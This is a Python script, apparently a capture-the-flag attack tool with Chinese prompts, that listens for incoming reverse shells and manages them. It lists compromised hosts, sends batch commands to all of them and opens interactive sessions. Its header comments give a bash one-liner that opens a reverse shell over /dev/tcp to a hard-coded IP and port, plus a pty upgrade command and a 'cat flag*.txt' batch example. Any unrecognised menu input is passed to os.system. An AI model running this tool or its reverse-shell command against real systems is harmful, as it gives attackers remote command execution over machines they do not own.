#encoding="utf-8"
#@version 2.0.0
#@author  Tkitn
#@python3
#Examples:
#python3 Tkitn_reverse_manage.py 0.0.0.0 9992
#python -c 'import pty;pty.spawn("/bin/bash")'
#bash -c 'bash -i >/dev/tcp/192.168.43.220/9992 0>&1'
#批量执行：cat flag*.txt
import socket
import threading
import os
import signal
import time
import sys

targets={'127.0.0.1':''}

def show_opt():
    print("[!]----Tkitn-Reverse-Manager----[!]")
    print("[!]----h:查看当前的shell帮助----[!]")
    print("[!]----a:所有shell批量执行----[!]")
    print("[!]----l:查看所有shell----[!]")
    print("[!]----g:进入某个交互式shell----[!]")
    print("[!]----d:删除某个shell----[!]")
    print("[!]----r:刷新目标shell字典----[!]")
    print("[!]----i:根据当前节点生成交互式shell----[!]")
    print("[!]----q:退出进程----[!]")

def sign_handler(signum,frame):
    print("")
    show_opt()

def server_bind(host,port):
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    server.bind((host, int(port)))
    print("[!]Listening on 0.0.0.0:9992...")
    while True:
            server.listen(40)
            conn, attr = server.accept()
            conn.setblocking(0)
            print("[!]Got connection from %s:%s" % (attr[0], attr[1]))
            Target_ob = Taget(conn)
            targets[attr[0]] = Target_ob    
        



def send_mes(conn):
    message=input(">>")
    conn.send(message.encode('utf-8')+"\n")

def recv_mes(conn):
    try:
        data=conn.recv(2048)
        print(data.decode('utf-8'))
    except socket.timeout:
        print("Connection timeout")
    except socket.error as e:
        print(e)


def transfer(h):
    slave = targets[h]
    socket_fd = slave.sock_target
    socket_fd.setblocking(1)
    while True:
        interactive_flag = slave.interactive_flag
        if(interactive_flag):
            data = socket_fd.recv(2048)
            sys.stdout.write(data.decode('utf-8'))
        else:
            break

class Taget():

    def __init__(self,sock_target):
        self.sock_target=sock_target
        self.hostname,self.hostport=sock_target.getpeername()
        self.interactive_flag = True

    def del_target(self,position):
        for i in list(targets.keys()):
            if(i==position):
                try:
                    del targets[i]
                    self.sock_target.close()
                    return True
                except:
                    return False

    def send_command(self,command):
        try:
            command = command + "\n"
            self.sock_target.send(command.encode('utf-8'))
            time.sleep(0.5)
            data = self.sock_target.recv(2048)
            print(data.decode('utf-8'))
        except:
            print("class Target send_message wrong")

    def refresh(self):
        try:
            command="hello"
            self.sock_target.send(command.encode('utf-8'))
        except socket.error as e:
            self.del_target(self.hostname)

    def interactive_shell(self):
        t = threading.Thread(target=transfer, args=(self.hostname,))
        t.start()
        try:
            while True:
                message = input(">>")
                if(message=="back"):
                    self.interactive_flag = False
                    self.sock_target.setblocking(0)
                    break
                else:
                    message = message + "\n"
                    self.sock_target.send(message.encode('utf-8'))
        except:
            pass


def main():
    host=sys.argv[1]
    port =int(sys.argv[2])
    signal.signal(signal.SIGINT,sign_handler)
    thread_server=threading.Thread(target=server_bind,args=(host,port))
    thread_server.setDaemon(True)
    thread_server.start()
    print("start server \n")
    time.sleep(0.5)
    show_opt()
    position =list(targets.keys())[0]
    while True:
        s=input("[!]"+position+">>"+"\n")
        if(s=="l"):
            print("-"*20)
            if(len(targets)==0):
                print("No target connect")
            for i in targets.keys():
                print(i)
            print("-" * 20)
        elif(s=="h"):
            show_opt()
        elif(s=="g"):
            target_host=input("输入目标ip:")
            for i in targets.keys():
                if(target_host==i):
                    position=target_host
                    current_object=targets[position]
            while True:
                try:
                    command = input("输入命令>>")
                    if(command=="back"):
                        break
                    else:
                        current_object.send_command(command)
                except:
                    print("something wrong")

        elif(s=="a"):#批量shell执行命令
            while True:
                c_command = input("批量命令>>")
                if(c_command=="back"):
                    break
                else:
                    for i in targets.keys():
                        if (i == '127.0.0.1'):
                            pass
                        else:
                            all_obj = targets[i]
                            print("-" * 40)
                            print(all_obj.hostname)
                            print("-" * 40)
                            all_obj.send_command(c_command)
        elif(s=="r"):# 刷新字典
            for i in list(targets.keys()):
                if (i == '127.0.0.1'):
                    pass
                else:
                    all_obj=targets[i]
                    all_obj.refresh()
        elif(s=="d"):#删除shell
            position=input("输入删除的ip:")
            obj_del=targets[position]
            if(obj_del.del_target(position)):
                print("成功删除%s的shell" %(position))
            else:
                print("删除%s的shell失败" %(position))
        elif (s == "i"):
            current_object=targets[position]
            current_object.interactive_shell()
        elif(s=="q"):
            exit(0)
        else:
            os.system(s)
if __name__ == '__main__':
    main()



